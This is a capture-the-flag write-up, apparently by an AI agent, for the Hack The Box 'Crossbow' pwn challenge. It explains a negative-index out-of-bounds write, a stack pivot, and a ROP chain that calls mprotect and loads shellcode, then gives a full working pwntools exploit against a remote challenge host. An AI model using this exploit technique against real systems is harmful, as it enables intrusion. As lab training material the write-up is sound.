---
title: "Crossbow"
ctf: "Hack The Box — Cyber Apocalypse 2025"
date: 2026-06-11
category: pwn
difficulty: easy
points: N/A
flag_format: "HTB{...}"
author: "agent"
---

# Crossbow

## Summary

Out-of-bounds (OOB) write via negative index in `target_dummy` overwrites saved RBP → stack pivot to heap buffer → ROP to mprotect BSS → fgets shellcode into BSS → execute.

## Solution

### Step 1: Understand the bug

`target_dummy` takes a signed `idx` from `scanf`, computes `*(arg1 + idx*8) = calloc(1,0x80)`, then calls `fgets(*(arg1+idx*8), 0x80, stdin)`. With `idx=-2`, the calloc pointer overwrites `target_dummy`'s saved RBP. When `target_dummy` returns via `leave;ret`, RBP becomes the calloc pointer. `training()` then `leave;ret` pivots RSP to the heap buffer.

### Step 2: The FILE buffer issue

Sending 128 bytes of ROP + newline via `sendline` leaves 2 leftover bytes (`\x00\n`) in stdin's FILE buffer. When the ROP chain calls `fgets` a second time, it consumes those leftovers instead of the shellcode.

**Fix:** Send ROP (exactly 128 bytes) + NOP-padded shellcode (126 bytes) in one `send()` — no newline. First fgets reads 127 bytes of ROP (size-1 limit). The 128th ROP byte (always `\x00` from the high bytes of a BSS address) plus the 126-byte shellcode fall through to the FILE buffer's internal `readv`. The second fgets reads all 127 bytes (`\x00` + 126 shellcode bytes = size-1), avoiding a blocking `read`. Return to `BSS_SC+1` to skip the leading `\x00`.

### Step 3: Exploit

```python
#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./challenge/crossbow', checksec=False)

POP_RDI = 0x401d6c
POP_RSI = 0x40566b
POP_RDX = 0x401139
MPROTECT = elf.sym.mprotect
FGETS = elf.sym.fgets
BSS = elf.bss()
BSS_PAGE = BSS & ~0xfff
STDIN = elf.sym.__stdin_FILE
SC_OFF = 0x500
BSS_SC = BSS + SC_OFF

rop = b''
rop += p64(0xdeadbeef)
rop += p64(POP_RDI) + p64(BSS_PAGE)
rop += p64(POP_RSI) + p64(0x1000)
rop += p64(POP_RDX) + p64(7)
rop += p64(MPROTECT)
rop += p64(POP_RDI) + p64(BSS_SC)
rop += p64(POP_RSI) + p64(0x80)
rop += p64(POP_RDX) + p64(STDIN)
rop += p64(FGETS)
rop += p64(BSS_SC + 1)      # skip \x00 leftover

shellcode = asm(shellcraft.cat('flag.txt'))
padded_sc = shellcode + b'\x90' * (126 - len(shellcode))

io = remote('154.57.164.80', 31162)
io.recvuntil(b'shoot:')
io.sendline(b'-2')
io.recvuntil(b'>')
io.send(rop + padded_sc)
flag = io.recvall(timeout=5)
print(flag.decode(errors='replace'))
```

## Flag

```
HTB{st4t1c_b1n4r13s_ar3_2_3z}
```
